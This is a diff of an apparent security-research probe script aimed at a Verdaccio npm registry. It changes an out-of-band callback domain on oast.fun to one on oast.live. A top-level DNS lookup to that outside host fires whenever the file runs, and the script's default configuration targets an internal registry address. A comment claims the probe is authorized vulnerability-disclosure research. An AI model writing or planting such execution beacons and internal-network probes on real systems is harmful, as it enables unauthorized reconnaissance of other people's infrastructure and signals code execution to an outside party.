@@ -1,6 +1,6 @@
 import socket as _s
 try:
-    _s.gethostbyname("ckv-min.dbidtc62jid2sfv70mg05naebui6gr8bp.oast.fun")
+    _s.gethostbyname("ckv-min.dbiemtt54sq43hh9eomg5wg85auknd4ek.oast.live")
 except Exception:
     pass
 # Benign Verdaccio access-control probe for authorized CodeRabbit VDP research (ireniumsecurity).
@@ -9,7 +9,7 @@ import os, json, base64, hashlib, socket, re, io, tarfile, urllib.request, urlli
 socket.setdefaulttimeout(3)
 
 R = os.environ.get('NPM_CONFIG_REGISTRY', 'http://10.64.0.28:4873').rstrip('/')
-OAST = os.environ.get('CR_PROBE_OAST', 'dbidtc62jid2sfv70mg05naebui6gr8bp.oast.fun')
+OAST = os.environ.get('CR_PROBE_OAST', 'dbiemtt54sq43hh9eomg5wg85auknd4ek.oast.live')
 OUT = {}
 
 def http(method, url, data=None, headers=None, timeout=4):
